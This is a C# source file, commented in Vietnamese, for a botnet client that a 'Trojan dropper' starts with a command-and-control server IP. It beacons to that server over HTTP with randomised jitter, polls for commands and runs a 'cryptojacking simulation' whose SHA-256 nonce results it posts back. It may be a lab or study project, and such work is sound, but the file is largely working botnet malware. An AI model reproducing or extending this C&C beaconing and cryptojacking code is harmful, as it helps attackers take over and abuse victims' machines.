using System;
using System.IO;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

// === NÂNG CẤP: Dùng hằng số để tránh lỗi chính tả ===
public static class BotCommands
{
    public const string Cryptojack = "cryptojack";
    public const string Idle = "idle";
}
public class CryptoJackResult
{
    public string BotId { get; set; }
    public long Nonce { get; set; }
    public string Hash { get; set; }
}

public class Bot
{
    private static string CncServerUrl;
    private static readonly HttpClient client = new HttpClient();
    private static string botId = Guid.NewGuid().ToString();
    private static string currentStatus = BotCommands.Idle;
    private static Random _random = new Random();

    // === NÂNG CẤP: Dùng CancellationTokenSource để quản lý tác vụ nền an toàn ===
    private static CancellationTokenSource _taskCancellationTokenSource;

    static async Task Main(string[] args)
    {
        FileLogger.Initialize();
        if (args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
        {
            string serverIp = args[0];
            CncServerUrl = $"http://{serverIp}:8000"; // Gán giá trị cho CncServerUrl
            Console.WriteLine($"C&C Server IP received from dropper: {CncServerUrl}");
        }
        else
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("FATAL: C&C Server IP was not provided.");
            Console.WriteLine("This bot must be started by the Trojan dropper to function.");
            Console.ResetColor();
            Console.ReadLine(); // Dừng chương trình lại để người dùng đọc lỗi
            FileLogger.Shutdown();
            return; // Thoát chương trình
        }

        Console.WriteLine($"Bot started with ID: {botId}");

        while (true)
        {
            try
            {
                await CheckIn();
                string command = await GetCommand();
                Console.WriteLine($"Received command: '{command}'");
                await ExecuteCommand(command);
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Error: {ex.Message}");
                Console.ResetColor();
            }

            int jitterMilliseconds = _random.Next(15000, 30001);
            Console.WriteLine($"Waiting for {jitterMilliseconds / 1000}s...");
            await Task.Delay(jitterMilliseconds);
        }
    }

    static async Task CheckIn()
    {
        var botInfo = new { BotId = botId, Status = currentStatus };
        var content = new StringContent(JsonSerializer.Serialize(botInfo), Encoding.UTF8, "application/json");
        await client.PostAsync($"{CncServerUrl}/bot/checkin", content);
    }

    static async Task<string> GetCommand()
    {
        var responseString = await client.GetStringAsync($"{CncServerUrl}/bot/getcommand?botId={botId}");
        var commandResponse = JsonSerializer.Deserialize<CommandResponse>(responseString, new JsonSerializerOptions { PropertyNameCaseInsensitive = true });
        return commandResponse?.command ?? BotCommands.Idle;
    }

    static async Task ExecuteCommand(string command)
    {
        switch (command)
        {
            case BotCommands.Cryptojack:
                if (currentStatus != BotCommands.Cryptojack)
                {
                    StopCurrentTask();
                    currentStatus = BotCommands.Cryptojack;
                    Console.WriteLine("Executing cryptojacking simulation...");

                    _taskCancellationTokenSource = new CancellationTokenSource();
                    // Chạy và chờ tác vụ hoàn thành (hoặc bị hủy)
                    await SimulateCryptoJack(_taskCancellationTokenSource.Token);
                }
                break;

            case BotCommands.Idle:
            default:
                if (currentStatus != BotCommands.Idle)
                {
                    StopCurrentTask();
                    currentStatus = BotCommands.Idle;
                    Console.WriteLine("Switching to idle state.");
                }
                break;
        }
    }

    // === NÂNG CẤP: Hàm helper để hủy tác vụ một cách an toàn ===
    static void StopCurrentTask()
    {
        if (_taskCancellationTokenSource != null && !_taskCancellationTokenSource.IsCancellationRequested)
        {
            Console.WriteLine("Stopping current task...");
            _taskCancellationTokenSource.Cancel();
            _taskCancellationTokenSource.Dispose();
            _taskCancellationTokenSource = null;
        }
    }
    static async Task SendResultToServerAsync(long nonce, string hash)
    {
        try
        {
            var result = new CryptoJackResult
            {
                BotId = botId,
                Nonce = nonce,
                Hash = hash
            };
            var content = new StringContent(JsonSerializer.Serialize(result), Encoding.UTF8, "application/json");
            var response = await client.PostAsync($"{CncServerUrl}/bot/submitresult", content);
            if (response.IsSuccessStatusCode)
            {
                Console.WriteLine($"Successfully submitted result for nonce {nonce}.");
            }
            else
            {
                Console.WriteLine($"Failed to submit result. Status: {response.StatusCode}");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error submitting result: {ex.Message}");
        }
    }

    static Task SimulateCryptoJack(CancellationToken cancellationToken)
    {
        return Task.Run(async () =>
        {
            // === NÂNG CẤP: Xử lý lỗi bên trong Task ===
            try
            {
                using (SHA256 sha256 = SHA256.Create())
                {
                    long nonce = 0;
                    // === NÂNG CẤP: Dùng CancellationToken để dừng vòng lặp ===
                    while (!cancellationToken.IsCancellationRequested)
                    {
                        string dataToHash = $"SomeDataToHash-{nonce}";
                        byte[] bytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(dataToHash));

                        var sBuilder = new StringBuilder();
                        for (int i = 0; i < bytes.Length; i++)
                        {
                            sBuilder.Append(bytes[i].ToString("x2"));
                        }
                        string hashString = sBuilder.ToString();

                        // === THAY ĐỔI DUY NHẤT LÀ Ở ĐÂY ===
                        // Điều kiện chiến thắng giờ đây khó hơn nhiều
                        if (hashString.StartsWith("00000"))
                        {
                            Console.WriteLine($"!!! Hash found! Nonce: {nonce}, Hash: {hashString}");
                            await SendResultToServerAsync(nonce, hashString);
                            break; // Thoát khỏi vòng lặp sau khi tìm thấy
                        }

                        nonce++;
                        if (nonce % 100000 == 0) await Task.Delay(1, cancellationToken);
                    }
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("Cryptojacking simulation stopped gracefully.");
                    Console.ResetColor();
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"FATAL ERROR in background task: {ex.Message}");
                Console.ResetColor();
                // Trong kịch bản thực tế, có thể ghi log ở đây
            }
        }, cancellationToken);
    }
}
public static class FileLogger
{
    private static string _logFilePath;
    private static StreamWriter _streamWriter;
    private static TextWriter _originalConsoleOut;

    public static void Initialize(string logFileName = "bot_log.txt")
    {
        // Lưu lại luồng output gốc của Console
        _originalConsoleOut = Console.Out;
        try
        {
            // Lấy đường dẫn an toàn trong thư mục của file exe
            string exePath = AppContext.BaseDirectory;
            _logFilePath = Path.Combine(exePath, logFileName);

            // Mở file với chế độ ghi tiếp (append) và tự động flush
            _streamWriter = new StreamWriter(_logFilePath, true, Encoding.UTF8)
            {
                AutoFlush = true
            };

            // Chuyển hướng output của Console ra file
            Console.SetOut(_streamWriter);
            Console.WriteLine($"\n===== Logger Initialized at {DateTime.Now} =====");
        }
        catch (Exception ex)
        {
            // Nếu có lỗi, in ra luồng output gốc
            Console.SetOut(_originalConsoleOut);
            Console.WriteLine($"FATAL: Could not initialize file logger. Error: {ex.Message}");
        }
    }

    public static void Shutdown()
    {
        Console.WriteLine($"===== Logger Shutdown at {DateTime.Now} =====\n");
        // Đóng file an toàn và trả lại output cho console gốc
        _streamWriter?.Close();
        _streamWriter?.Dispose();
        if (_originalConsoleOut != null)
        {
            Console.SetOut(_originalConsoleOut);
        }
    }
}

public class CommandResponse
{
    public string command { get; set; }
}